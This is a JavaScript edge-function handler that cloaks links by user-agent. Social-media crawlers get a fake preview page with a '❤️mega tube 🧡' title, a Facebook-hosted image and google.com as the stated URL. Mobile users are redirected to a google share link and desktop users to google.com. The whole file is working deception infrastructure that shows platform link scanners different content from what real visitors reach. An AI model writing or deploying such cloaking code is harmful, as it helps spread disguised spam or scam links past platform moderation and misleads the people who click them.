export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️mega tube 🧡">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://scontent.fkhi11-2.fna.fbcdn.net/v/t39.30808-6/813987335_122113713837438005_4652048052127954824_n.jpg?stp=dst-jpg_tt6&cstp=mx1200x630&ctp=s1200x630&_nc_cat=111&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=127cfc&_nc_eui2=AeEeyABmGHrAAwh2eNAMP9gyMTfp5xvGv7gxN-nnG8a_uAgPcONs-BwDrugW09opk2G0bTZ7G5PHhkY662s9wW6h&_nc_ohc=uDR_TBg15W4Q7kNvwEYboxf&_nc_oc=AdoEf-6ytNFGF_0aQFMh4400o7R_dUX-LZd0AK4IYPUMAyZTaHRTa-qc89g8p6cWZw8&_nc_zt=23&_nc_ht=scontent.fkhi11-2.fna&_nc_gid=v82fiaCwIG-bLaOtNWdnEw&_nc_ss=7b2a8&oh=00_AQIpqDnXPzY5GAk8vYxAXADhrTpTGq9qbFWDrxD74CzY3g&oe=6AB365BA">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://www.google.com/share.google?q=BSN8Os0U4KWtt5cdN", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
